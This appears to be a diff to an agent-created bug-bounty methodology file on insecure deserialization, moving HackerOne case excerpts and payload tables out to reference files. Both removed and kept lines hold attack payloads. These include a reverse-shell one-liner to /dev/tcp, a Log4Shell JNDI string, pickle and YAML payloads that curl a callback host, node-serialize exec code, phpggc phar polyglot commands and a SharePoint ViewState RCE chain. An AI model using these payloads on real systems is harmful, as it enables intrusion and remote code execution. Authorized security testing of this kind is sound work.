@@ -4,13 +4,13 @@ description: "Use for serialized objects in cookies, tokens, parameters, files o
 agent_created: true
 ---
 
-# Insecure Deserialization — unified skill
+# Insecure Deserialization — unified methodology
 
-> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 3 upstream skills across cbh, h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.
 
-## Corpus evidence — 69 valid HackerOne reports (20 paid / 29%)
+## Corpus signal — 69 valid reports (20 paid / 29%)
 
-Every disclosed report is valid; payment is an impact signal, not a validity test.
+Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.
 
 ### Techniques ranked across ALL valid reports
 
@@ -28,108 +28,6 @@ Every disclosed report is valid; payment is an impact signal, not a validity tes
 | third-party data / paste / breach reuse | 6 |
 | encoding / double-encode / null byte | 6 |
 | HTTP method / verb tampering | 6 |
-| subdomain / DNS / cert-transparency recon | 5 |
-| race / concurrency / timing | 5 |
-| XML / SOAP / SAML / XXE | 5 |
-| parser confusion / normalization | 4 |
-| WAF / sanitizer / filter bypass | 4 |
-| API docs / Swagger / introspection | 3 |
-| git history / exposed .git | 3 |
-| parameter pollution / duplicate keys | 3 |
-| unauthenticated / removed-cookie test | 3 |
-| header injection (Host / X-Forwarded / etc.) | 3 |
-| two-account / cross-account replay | 2 |
-| webhook / OAuth / SAML / integration abuse | 2 |
-| OAST / DNS / HTTP callback proof | 2 |
-| JS bundle / source-map inspection | 2 |
-| second-order / stored / blind delivery | 2 |
-|  HosT/absolute-URL reset poisoning | 1 |
-| replay / modify a captured request | 1 |
-| swap object ID / parameter value | 1 |
-| template injection (SSTI) | 1 |
-
-### Parameters observed in writeups
-
-`concept` (3), `mitigation` (3), `dashboard` (3), `keyid` (2), `settings` (2), `location` (2), `enable_xcom_pickling` (2), `context` (1), `res` (1), `publickey` (1), `data` (1), `xuw8gddtvu51x3nmfnmmxiq` (1), `files` (1), `manager` (1), `value` (1), `rowid` (1), `user.provider.url` (1), `usefirstpass` (1), `servicename` (1), `debug` (1), `group.provider.url` (1), `enable_xcom_deserialize_support` (1), `max-age` (1), `hsts` (1), `exit` (1), `chunk` (1)
-
-### Bypass primitives observed
-
-`content-type` (9), `bypass` (3), `bypassing` (2), `type confusion` (1)
-
-### Impact language observed
-
-`rce` (29), `remote code execution` (28), `token` (23), `password` (12), `arbitrary code` (10), `admin` (8), `localhost` (7), `arbitrary file` (6), `privilege escalation` (3), `exfiltrate` (2), `account takeover` (1), `credential` (1)
-
-### Case studies — full excerpts (paid and unpaid)
-
-#### [1529790](https://hackerone.com/reports/1529790) — Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration
-
-Aiven Ltd · $5000 · critical
-
-## Summary: When configuring the connector via the Aiven API or the Kafka Connect REST API, the attacker can set the `database.history.producer.sasl.jaas.config` connector property for the `io.debezium.connector.mysql.MySqlConnector` connector. This is likely true for other debezium connectors too. By setting the connector value to `"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";"`, the server will connect to the attacker's LDAP server and it deserializes the LDAP response, which the attacker can use to execute java deserialization gadget chains on the kafka connect server. ## Steps To Reproduce: ██████ 1. Login into my VPS: `ssh ███████`, password: `█████` 1. Execute `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1"` 1. Execute `nc -nlvp 4445` on another tab 1. Execute `python3 poc.py` on another table. This poc script launches the exploit against my Aiven kafka connect instance. 1. Reverse shell connection should now be established ## The gadget chain The exploit uses `System.setProperty` gadget chain in the scala standard library to enable unsafe deserialization of apache commons collections transformers (finding this gadget chain took way too much time...). This payload has been designed for the Scala 
-
-#### [3031518](https://hackerone.com/reports/3031518) — CVE-2025-24813: Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet
-
-Internet Bug Bounty · $4323 · high
-
-I am sw0rd1ight.I found an Apache Tomcat RCE vulnerability in tomcat 9.0.98. If all of the following were true, a malicious user was able to perform remote code execution: - writes enabled for the default servlet (disabled by default) - support for partial PUT (enabled by default) - application was using Tomcat's file based session persistence with the default storage location - application included a library that may be leveraged in a deserialization attack I reported this vulnerability through the official Apache Tomcat security email and received a fix along with a CVE number CVE-2025-24813. this is screenshot of email and ASF response email I submitted. {F4134453} {F4134456} {F4134458} {F4134462} {F4134464} {F4134466} ## Impact Execute system commands to obtain system permissions
-
-#### [3861550](https://hackerone.com/reports/3861550) — connect.8x8.com: Deserialization Vulnerability  in Automation Builder via Jint→Newtonsoft serializer coercion (TypeNameHandling)
-
-8x8 · $3000 · critical
-
-@kyotozzx reported a deserialization vulnerability in the 8x8 Connect Automation Builder's HTTP request step. The vulnerability occurred when server-side template evaluation exposed Newtonsoft JSON objects directly to the Jint JavaScript engine. By providing a specially crafted JSON response, an authenticated user could coerce Jint's overload resolution to construct a `JsonSerializer` with attacker-controlled `TypeNameHandling` settings, enabling deserialization of arbitrary .NET types including `System.Diagnostics.Process`. The issue was quickly addressed by projecting HTTP responses to plain JavaScript values (`System.Dynamic.ExpandoObject`) before template evaluation, removing all Newtonsoft object exposure from the template scope. We thank @kyotozzx for submitting this report to us.
-
-#### [274990](https://hackerone.com/reports/274990) — Remote code execution on rubygems.org
-
-RubyGems · $1500 · critical
-
-When parsing a gem POSTed to the `/api/v1/gems` endpoint, the rubygems.org application immediately calls `Gem::Package.new(body).spec` inside `app/models/pusher.rb`. The authors of the application correctly observed that parsing untrusted YAML is dangerous (since it can serialize more or less arbitrary objects), so they monkey-patched the spec parser to use `Psych.safe_load` set from `config/initializers/forbidden_yaml.rb`. However, `YAML.load` is called directly when parsing the gem's checksum file in `Gem::Package#read_checksums`. Using classes accessible within the application, I was able to turn this into a call to `Marshal.load` on attacker-controlled data. From there, I was able to use known Marshal exploitation techniques to achieve code execution on the server (I'm omitting some details here for brevity so that I can submit this report right away). A proof of concept, `poc.gem`, is attached. Run the exploit with the following command: `cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: █████' I ran the attached PoC twice. It just does a `wget` to my server. Please let me know if I should clarify anything! Thanks for running this program.
-
-#### [1425474](https://hackerone.com/reports/1425474) — [CVE-2021-44228] nps.acronis.com is vulnerable to the recent log4shell 0-day
-
-Acronis · $1000 · critical
-
-## Summary The website at nps.acronis.com is vulnerable to CVE-2021-44228 ## Steps To Reproduce I used this [script]( to find this. It spins up an interact-sh server to receive the callback and send the payload in the query string and about 30 diffent headers. You can reproduce manually with curl and interact-sh/burp collaborator/a server you control. However, since the callback is proof of the vulnerability, the script makes it easier to identify. Let me know if you want me to tell you which specific header fires the payload and I will test them. 1. Construct the payload: `${jdni:ldap://nps.acronis.com.<your-server>/test}` 1. Inject the payload in the Request Headers (User Agent, X-Forwarded-For etc) or use the script from fullscan: `python3 log4j-scan.py -u ' 1. Observe the callback, proving the deserialization of untrusted data which leads to rce {F1544482} ## Recommendations Update log4j to the latest [version]( If updating to the latest version is not possible the vulnerability can be mitigated by removing the JndiLookup class from the class path. Additionally, the issue can be mitigated on Log4j versions >=2.10 by setting the system property log4j2.formatMsgNoLookups or the LOG4J_FORMAT_MSG_NO_LOOKUPS environment variable to true. ## Impact Remote Code Execution (rce)
-
-#### [396954](https://hackerone.com/reports/396954) — Attacker can add arbitrary data to the blockchain without paying gas
-
-Rootstock Labs · no bounty — still valid · critical
-
-**Summary:** Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid. **Description:** The issue stems from the Transaction::rlpParse function: Once all the relevant data is pulled from the decoded RLP, there are no checks to ensure that we've reached the end of the data. Since the transaction is constructed using the raw encoded bytes, any future calls to getEncoded() will return the entire byte array, including the bad data at the end. Signature verification of the valid transaction will still pass because it uses getRawEncoded() to compute the signature, which ignores the extra data. ## Steps To Reproduce: On a remote server I start up a regtest node from a clean codebase. This will begin mining as a single-node network: On my local machine, I start another regtest node but I modify the config to a) talk to my remote node, and b) not mine. I don't mine on this node because I will be using it to manufacture beefy transactions and I want to make sure that other, clean nodes will accept/mine these transactions. In addition to the config changes, 
-
-#### [1842674](https://hackerone.com/reports/1842674) — SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai
-
-Krisp · no bounty — still valid · critical
-
-[tenweb-speed-optimizer]( wordpress plugin by [10web.io]( prior to 2.12.22 version was vulnerable to **UNAUTHENTICATED** SQL injection (in `/wp-json/tenwebio/v2/compress-one`) which could be chained with insecure deserialization in the plugin to gain RCE. Vendor published the issue as an "authenticated" one (update: wordfence team corrected it !) - [here]( We would like to thank @mikemyers for reporting it responsibly to us.
-
-### Recurring approach patterns from real reports
-
-- 3× attached is a video detailing the poc generating the payload for generate the payload i used the tool ysoserial
-- 2× sending the payload to a vulnerable server curl data binary payload k after sending the payload to the dod server the code was successfully executed and i received the dns query on my bind server as can be seen in the log record below
-- 1× when parsing a gem posted to the api v1 gems endpoint the rubygems org application immediately calls gem package new body spec inside app models pusher rb
-- 1× however yaml load is called directly when parsing the gem s checksum file in gem package read checksums
-- 1× using classes accessible within the application i was able to turn this into a call to marshal load on attacker controlled data
-- 1× from there i was able to use known marshal exploitation techniques to achieve code execution on the server i m omitting some details here for brevity so that i can submit this report right away
-- 1× in this case as far as i have seen it is used for notifications
-- 1× as far as i have seen the deserializer is only used to render notifications in render notifications as seen here the render notifications function is then used on the notifications template page as seen here there is no other place where the deserializer is used as far as i have seen
-- 1× in addition to the config changes i have also modified the eth sendtransaction code to add extra rlp encoded bytes to the end of the transaction
-- 1× i could have used the eth sendrawtransaction endpoint but i didn t want to go through the process of hand constructing the rlp encoded data impact the attacker can add arbitrary data into the blockchain without paying the requisite gas or undergoing any validation of the extra data
-- 1× i have not checked to see how much data can be appended but i assume its limited only by whatever overall block transaction message size constraints exist
-- 1× i ve tested with the earliest and latest supported rails version and and both are affected
-- 1× we found that insecure deserialization allowed certain java classes in the paypal android app to be accessed by a malicious app on the same device
-- 1× i found a deserialization vulnerability in the ownbackup app this vulnerability allows to execute remote code in the server
-- 1× description we identified potential unsafe deserialization vulnerability on the endpoint
-- 1× hello i found an outdated version of telerik web ui v2016 at the following url this means that we can achieve full rce by chaining two different cves cve which allows us to upload arbitrary files on the server and cve which is a deserialization vulnerability
-- 1× first of all the only thing that i tried to prove that i had successfully achieved code execution was making the server sleep for seconds
-- 1× things to note i had to edit the original exploit code provided in the aforementioned blog post because i noticed that when uploading the dll file the server added a tmp at the end of the file name
-- 1× i added tmp at the end of line and after that it worked just fine
-- 1× from here on out i used the write up at for reference
-- 1× with a slight modification to the script in the bishopfox write up i was able to determine the software version the versions txt file i used has been attached to this report for ease of replication
-- 1× as shown in the results the version is vulnerable to cve and i was able to successfully upload the testfile txt
-- 1× to chain gadgets i found nice gadgets to delete some files
-- 1× i created it based on geminabox use evil sever impact of course there is a danger in specifying an untrusted source and in the possibility of a man in the middle attack
 
 ## Corpus-backed method (this class)
 
@@ -156,18 +54,13 @@ Krisp · no bounty — still valid · critical
 - Deserialization -> RCE -> internal access.
 - Object injection -> auth flag change -> privilege escalation.
 
-### Probes
-
-- rO0 base64 cookies, PHP O: object strings, pickle/protocol markers, Java ViewState.
-
 ### Veteran tip
 
 The operator's field notes: identify the language first, then the serialization grammar, then choose the gadget — never blind-fire payloads.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Quick wins
 
 Start here. These are the highest-yield tests for this class.
@@ -197,10 +90,7 @@ Start here. These are the highest-yield tests for this class.
 - PHP phar:// surface: any file-upload endpoint plus any later filesystem call on an attacker-influenced path (`file_exists`, `filesize`, `getimagesize`, `is_readable`, `include`) is a candidate — no explicit `unserialize()` in the code required.
 - 2025-2026 advisories to pattern-match: OpenMage LTS GHSA-fg79-cr9c-7369 (CVE-2026-25524) — ICO/phar JPEG polyglot uploads reaching `getimagesize()` → RCE; connect.8x8.com (H1, 2026, $3,000) — Jint→Newtonsoft `TypeNameHandling` coercion in an automation builder.
 - Source-review greps when you have code: `unserialize(`, `readObject(`, `pickle.loads`, `yaml.load`, `Marshal.load`, `BinaryFormatter`, `TypeNameHandling`, `ObjectInputStream`, `populate({ match:` / sift (Mongoose).
-- Backup/source disclosure adjacent to the sink: PortSwigger's custom-chain lab leaks `CustomTemplate.php~` — always try `~`, `.bak`, `.old`, `.orig` on referenced source files.
-
-### Signals and surfaces
-
+- Backup/source disclosure adjacent to the sink: PortSwigger's custom-chain lab leaks `CustomTemplate.php~` — always try `~`, `.bak`, `.old`, `.orig` on referenced source files.### Signals and surfaces
 ### Signal
 
 - Reports: **93** · paid: **27**
@@ -250,10 +140,7 @@ Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
 Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
 ```
 
----
-
-### Techniques, payloads and bypasses
-
+---### Techniques and bypasses
 ### Payloads & probes
 
 - Java -> `rO0AB...` + ysoserial gadget
@@ -370,10 +257,7 @@ Recurring payloads from this class's writeups. Adapt, don't paste blindly.
 - Custom PHP chain pattern from the PortSwigger lab: chain `__wakeup()` → `Product` constructor → `DefaultMap::__get()` → `call_user_func($callback, $name)` to reach `exec`.
 - Python pickle: `__reduce__` returning `(os.system, ('curl http://COLLAB/pickle',))`; `yaml.load` pre-5.1: `!!python/object/apply:os.system ['curl http://COLLAB/yaml']`; Node `node-serialize`: `_$$ND_FUNC$$_function(){require('child_process').exec(...)}()`.
 - phar:// polyglot: `phpggc -p phar -o poly.jpg Monolog/RCE1 system id` prepends a valid JPEG/GIF header so image validation passes, then reach `phar://uploads/poly.jpg/x` through any filesystem function — PHP ignores the extension when reading a stream.
-- .NET: YSoSerial.Net `-f BinaryFormatter -g TypeConfuseDelegate`; on SharePoint, chain anonymous XXE in `_vti_bin/*.asmx` → `web.config` → `<machineKey>` → ViewState deserialization RCE.
-
-### Validation and proof
-
+- .NET: YSoSerial.Net `-f BinaryFormatter -g TypeConfuseDelegate`; on SharePoint, chain anonymous XXE in `_vti_bin/*.asmx` → `web.config` → `<machineKey>` → ViewState deserialization RCE.### Validation and proof
 ### Reporting bar
 
 - Prove real impact on a second controlled account or a safe callback.
@@ -439,10 +323,7 @@ Recurring payloads from this class's writeups. Adapt, don't paste blindly.
 ✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
 ✅ Command output in response: full RCE confirmed
 
-**Severity:** Almost always **Critical** — RCE with server process privileges.
-
-### Escalation and related chains
-
+**Severity:** Almost always **Critical** — RCE with server process privileges.### Escalation and related chains
 ### Escalation chains
 
 - Deserialization -> RCE.
@@ -462,10 +343,7 @@ Recurring payloads from this class's writeups. Adapt, don't paste blindly.
 | Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
 | Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |
 
----
-
-### Tools and wordlists
-
+---### Tools
 ### Tools
 
 `ysoserial` · `phpggc` · `marshalsec` · `Burp` · `interactsh`
@@ -501,10 +379,7 @@ nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \
 # authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
 ```
 
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-### Sources and related reading
-
+Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.### Sources and related reading
 ### Query the corpus
 
 ```sh
@@ -533,10 +408,7 @@ python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class dese
 ### D. Sources — numbered list of URLs you actually fetched
 
 1. https://portswigger.net/web-security/deserialization/exploiting
-2. https://www.hackerone.com/blog/how-serialized-cookies-led-rce-wordpress-website
-
-### Additional notes
-
+2. https://www.hackerone.com/blog/how-serialized-cookies-led-rce-wordpress-website### Additional notes
 ### Parameters observed
 
 `id` · `type` · `qid` · `scoretype` · `f.input`
@@ -691,161 +563,8 @@ interactsh-client -v -n 5
 git clone https://github.com/pimps/JNDI-Exploit-Kit
 ```
 
----
-
-## Companion methodology (complete, deduplicated)
-
-Full text of every non-SKILL.md methodology document from the contributing skills.
-
-### Companion: hunting / references/payloads.md
-
-# Deserialization — Combined Field Guide — Payload reference
-
-Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
-
----
-
-## Payloads & probes
-
-
-
-- Java -> `rO0AB...` + ysoserial gadget
-
-- PHP -> `O:8:"stdClass":...`
-
-- Python -> `cos\nsystem\n(S'id'\ntR.` pickle
-
-- Ruby -> `\x04\b[` Marshal
-
-
-
-## Payload fragments observed
-
-
-
-Recurring payloads from this class's writeups. Adapt, don't paste blindly.
-
-
-
-| Seen | Fragment |
-
-|---:|---|
-
-| 3× | `$templates` |
-
-| 3× | `__proto__` |
-
-| 2× | `$cache` |
-
-| 2× | `curl -v \ / --proxy https://127.0.0.1:18443 --proxy-insecure \ / --hsts ./hsts-cache.txt \ / http://hsts-probe.test:18080/` |
-
-| 2× | `cf_ssl_is_alive()` |
-
-| 1× | `system('id')` |
-
-| 1× | `$_COOKIE['nc_form_fields']` |
-
-| 1× | `${jdni:ldap://nps.acronis.com.<your-server>/test}` |
-
-| 1× | `ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */ / { / zend_object *zobj; / zobj = Z_OBJ_P(object); / if (!zobj` |
-
-| 1× | `curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:"GMP":106:{s:1:"5"%3ba:2:{s:5:"cache"%3ba:1:{s:5:"index"%3bs:14:"{${phpinfo()}}"%3b}i:0%3bO:12` |
-
-| 1× | `Gem::Package.new(body).spec` |
-
-| 1× | `PS C:\>ysoserial.net\ysoserial\bin\Release\ysoserial.exe -p DotNetNuke -m read_file -f C:\Windows\win.ini` |
-
-| 1× | `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1` |
-
-| 1× | `\\| Packet type (` |
-
-| 1× | `\\|$$$$$$$$$$$$\\|*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |
-
-| 1× | `$$$$$$$$$$$$*************@@@@@@@@@@@@%%%%%%%%%` |
-
-| 1× | `\\|$$$$$$$$$$$$*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |
-
-| 1× | `POST /daip/messagebroker/amf HTTP/1.1 / Host: www.███████ / Connection: close / Accept-Encoding: gzip, deflate / Accept: */* / User-Agent: p` |
-
-| 1× | `script.py <collaborator> 80` |
-
-| 1× | `❯ RUBYGEMS_PROXY=true rackup / Puma starting in single mode... / * Puma version: 5.2.2 (ruby 2.7.1-p83) ("Fettisdagsbulle") / * Min threads:` |
-
-
-
-## Parameters observed
-
-
-
-`id` · `type` · `qid` · `scoretype` · `f.input`
-
-
-
-## Wordlists
-
-
-
-Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.
-
-
-
-| File | Entries |
-
-|---|---:|
-
-| `~/.local/share/hackerone-reports/wordlists/paths_deserialization.txt` | 76 |
-
-| `~/.local/share/hackerone-reports/wordlists/params_deserialization.txt` | 5 |
-
-| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
-
-| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |
-
-
-
-```sh
-
-W=~/.local/share/hackerone-reports/wordlists
-
-ffuf -u https://target/FUZZ -w $W/paths_deserialization.txt \
-
-     -mc all -fc 404 -fs 0 -rate 40
-
-ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_deserialization.txt \
-
-     -mr 'canary|error|invalid|not found' -rate 40
-
-```
-
-
-
-## Nuclei
-
-
-
-Scanner coverage is thin; decode cookies/tokens and identify the serialization format manually.
-
-
-
-```sh
-
-nuclei -u https://target -tags deserialization \
-
-       -severity low,medium,high,critical -rl 40 -o nuclei_deserialization.txt
-
-nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \
-
-       -rl 40 -o nuclei_deserialization_other.txt
-
-# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
-
-```
-
-
-
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-### Companion: hunting / references/techniques.md
+---### Companion methodology (deduplicated)
+### hunting / references/techniques.md
 
 # Deserialization — Combined Field Guide — Technique reference
 
@@ -1103,111 +822,13 @@ python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class deseri
 
 python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class deserialization --min-bounty 1000
 
-```
+```## Probes
 
-## Corpus wordlists (mined)
+- rO0 base64 cookies, PHP O: object strings, pickle/protocol markers, Java ViewState.
 
-### `params_deserialization.txt`
+## Supporting data
 
-```text
-id
-type
-qid
-scoretype
-f.input
-```
-
-### `paths_deserialization.txt`
-
-```text
-/bug.php
-/Telerik.Web.UI.WebResource.axd
-/apps/XTRAHome/Telerik.Web.UI.WebResource.axd
-/vuln/detail/CVE-2017-10366
-/2016/04/java-deserialization-dos-payloads.html
-/test
-/exploits/48336
-/api/v1/dependencies
-/nextcloud/index.php/apps/social/@testuser2
-/psc/EXPROD/
-/RPC
-/plugins/tenweb-speed-optimizer/
-/wp-json/tenwebio/v2/compress-one
-/woocommerce/includes/import/class-wc-product-csv-importer.php
-/2018/new-php-exploitation-technique/
-/php/array/languages-name-and-code
-/newsletter/
-/log4j/2.x/download.html
-/shell.aspx
-/api/v1/gems
-/security/cve/cve-2017-7504
-/wEylQkAAQAAAP/
-/blog/exploit-dotnetnuke-cookie-deserialization/
-/item
-/post/cve-2021-25738/
-/invoker/JMXInvokerServlet
-/invoker/EJBInvokerServlet
-/posts/higherlogic_rce
-/daip/messagebroker/amf
-/concrete5_exploit.phar
-/dashboard/system/files/storage
-/phar:/
-/██████████/Telerik.Web.UI.WebResource.axd
-/█████/Telerik.Web.UI.WebResource.axd
-/███/Telerik.Web.UI.WebResource.axd
-/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization
-/apps/ownbackup
-/owncloud/index.php/apps/ownbackup/restore-tables
-/apps
-/nextcloud/index.php/apps/social/@testuser2/inbox
-/www.w3.org
-/nextcloud/index.php/apps/social/@testuser2/following
-/social
-/security
-/activitystreams
-/nextcloud/index.php/apps/social/@testuser2/followers
-/mallory.json
-/nextcloud/index.php/apps/social/@mallory
-/index.php
-/nextcloud/index.php/apps/social/@testuser2/outbox
-/nextcloud/index.php/apps/social/inbox
-/nextcloud
-/v1
-/w3id.org
-/nextcloud/index.php/apps/social/@testuser2/15446114504147655329
-/@mallory
-/QIDAQAB
-/ns
-/forgot-password
-/psc/EXPROD_1/
-/monitor
-/monitor/EXPROD_1
-/en/3.2/topics/cache/
-/vulnerabilitydetails
-/package/cryo
-/package/kaiser
-/package/funcster
-/CN=localhost
-/application/files/tmp/test.php
-/[concrete5
-/hc/en-us/articles/115000350007
-/repomanager3/download
-/RPC2
-/ramdisk/php-fuzz/phuzzer/php-70/sapi/cli/php
-/ramdisk/php-fuzz/phuzzer/php-70/
-/yaml.txt
-```
-
-## Source skills merged into this topic
-
-- `h1skills` — `hackerone-deserialization`
-- `hunting` — `deserialization`
-- `cbh` — `hunt-deserialization`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `references/upstream-assets/` — 2 companion files
-- `../../upstream/` — complete unmodified archives of all five source repositories
+- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
+- `references/payloads.md` — curated payload bank + upstream payload references
+- `references/wordlists/` — 2 mined paths/params/payload lists
 - `bbhunt-methodology` — orchestrator, state machine and class router
